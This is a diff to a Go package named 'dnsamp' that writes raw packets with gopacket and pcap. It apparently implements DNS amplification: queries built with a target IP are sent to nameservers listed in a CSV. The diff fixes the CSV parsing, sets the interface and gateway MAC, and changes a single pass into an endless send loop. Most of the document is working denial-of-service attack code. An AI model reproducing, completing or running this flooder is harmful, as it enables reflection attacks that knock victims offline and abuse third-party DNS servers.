@@ -1,9 +1,9 @@
 package dnsamp
 
 import (
+	"encoding/csv"
 	"math/rand"
 	"net"
-	"encoding/csv"
 	"os"
 
 	"github.com/google/gopacket"
@@ -18,7 +18,7 @@ type Target struct {
 }
 
 const SRC_PORT = 42000
-const IFACE = "enp0s31f6"
+const IFACE = "wlp166s0"
 
 var options gopacket.SerializeOptions
 var srcMac net.HardwareAddr
@@ -28,7 +28,8 @@ func init() {
     var err error
     srcMac = getHardwareAdress()
     // TODO: find a way to get the gateway MAC address
-    dstMac, err = net.ParseMAC("94:3c:96:b3:8e:9d")
+    dstMac, err = net.ParseMAC("ac:15:a2:be:6e:88")
+    // dstMac = layers.EthernetBroadcast
     if err != nil {
         panic(err)
     }
@@ -112,30 +113,33 @@ func ReadFile(filename string) []Target {
         panic(err)
     }
     res := []Target{}
+    // domain, nameserver, ip, request response, tc
     for _, record := range records {
         target := Target{
             DomainName: record[0],
-            NameServer: record[1],
+            NameServer: record[2],
         }
         res = append(res, target)
     }
     return res
 }
 
-// Goroutine to send packets, each thread has own number and it uses that number as modulo for which line to read
-// Proceed in round-robin fashion (cycling through domains / name servers)
 func Send(targetIP net.IP, servers []Target) {
     handle, err := pcap.OpenLive(IFACE, 1500, false, pcap.BlockForever)
     if err != nil {
         panic(err)
     }
-    // Keep sending packets, TODO: put this in loop after it works
-    for _, server := range servers {
-        nameserverIP := net.ParseIP(server.NameServer)
-        packet := makePacket(targetIP, server.DomainName, nameserverIP)
-        err = handle.WritePacketData(packet)
-        if err != nil {
-            panic(err)
+    // Send packets forever
+    for {
+        for _, server := range servers {
+            nameserverIP := net.ParseIP(server.NameServer)
+            if nameserverIP != nil {
+                packet := makePacket(targetIP, server.DomainName, nameserverIP)
+                err = handle.WritePacketData(packet)
+                if err != nil {
+                    panic(err)
+                }
+            }
         }
     }
 }
